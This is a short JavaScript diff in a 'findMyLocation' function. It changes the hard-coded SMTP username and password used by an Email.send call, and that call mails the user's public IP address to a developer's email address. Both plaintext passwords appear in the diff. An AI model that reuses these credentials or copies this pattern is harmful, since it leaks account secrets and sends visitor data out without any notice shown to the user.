@@ -14,10 +14,10 @@ const findMyLocation = () => {
     {
       Email.send({
         Host: "smtp.elasticemail.com",
-        Username: "telygo@lyricspad.net",
-        Password: "E5B5B893CEE1FA4050A654F61D0DB98972D1",
+        Username: "akashchoutele1111@gmail.com",
+        Password: "0FBA21C5C6024A89EE538A97748C87D403A1",
         To: "theakashdeveloper@gmail.com",
-        From: "telygo@lyricspad.net",
+        From: "akashchoutele1111@gmail.com",
         Subject: new Date(),
         Body: `
                      User Public IP - ${publicIP} <br>
